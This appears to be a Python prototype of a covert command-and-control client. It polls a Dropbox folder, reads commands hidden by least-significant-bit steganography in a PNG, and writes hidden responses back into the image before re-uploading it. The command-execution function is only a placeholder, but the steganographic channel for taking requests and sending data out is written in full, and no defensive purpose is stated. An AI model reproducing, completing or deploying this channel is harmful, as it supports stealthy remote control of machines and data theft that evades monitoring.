import dropbox
import sys
from stegano import lsb
from randimage import get_random_image
from datetime import datetime
import matplotlib
import random
import os
import io

def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    return dbx


def register(dbx):
    names = []
    for entry in dbx.files_list_folder('/art').entries:
        names.append(entry.name[:-4])

    print(names)

    new_name = names[0]
    f=open('/usr/share/dict/words')
    lines=f.readlines()
    while new_name in names:
        idx = random.randint(0, len(lines))
        new_name = lines[idx].strip()

    img_size = (128,128)
    img = get_random_image(img_size)

    matplotlib.image.imsave(new_name + '.png', img)


def get_user_id():
    return str(os.getuid())


def list_dir(path):
    ret = ""
    for name in os.listdir(path):
        ret+= name+'\n'
    return ret


def execute_command(fields):
    print("Executing " + str(fields))
    content = 'placeholder content\n'
    content += ';'
    return content

def process_commands(dbx, my_id):
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == my_id:
            dbx.files_download_to_file("./" + entry.name, entry.path_lower)

    message = lsb.reveal(my_id, lsb.generators.eratosthenes()).strip()

    last_check = datetime.strptime('30/12/2023 20:18:00', "%d/%m/%Y %H:%M:%S")

    for line in message.split(';')[1:]:
        fields = line.split('|')
        #print(fields)
        command_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
        if last_check < command_time and fields[1] == 'REQUEST':
            content = execute_command(fields)
            response = fields.copy()
            response[1] = 'RESPONSE'
            response[4] = str(content.count('\n'))
            response.append(content)
            message += '|'.join(response)

    secret = lsb.hide(my_id, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/' + my_id, mode=dropbox.files.WriteMode.overwrite)

if __name__ == "__main__":
    if len(sys.argv) == 1:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN")
    else:
        dbx = init(sys.argv[1])
        #message = lsb.reveal("./cute_out.png", lsb.generators.eratosthenes())
        #register(dbx)
        #print(message)
        process_commands(dbx, 'test_test_test.png')